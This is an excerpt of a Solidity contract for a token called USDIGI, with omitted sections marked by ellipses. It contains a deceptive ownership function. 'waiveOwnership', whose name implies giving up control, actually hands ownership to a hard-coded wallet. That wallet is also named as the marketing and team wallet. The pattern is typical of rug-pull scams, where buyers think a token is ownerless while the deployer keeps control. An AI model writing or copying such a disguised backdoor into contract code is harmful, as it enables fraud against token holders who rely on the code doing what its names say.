...
// Telegram : https://t.me/USDIGIChannel
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xE44aEd705e6b4EB1b6c6cE49427bAb6deAf8fDc1);
    }
...
contract USDIGI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "USDIGI";
    string private _symbol = "USDIGI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xE44aEd705e6b4EB1b6c6cE49427bAb6deAf8fDc1);
    address payable public teamWalletAddress = payable(0xE44aEd705e6b4EB1b6c6cE49427bAb6deAf8fDc1);
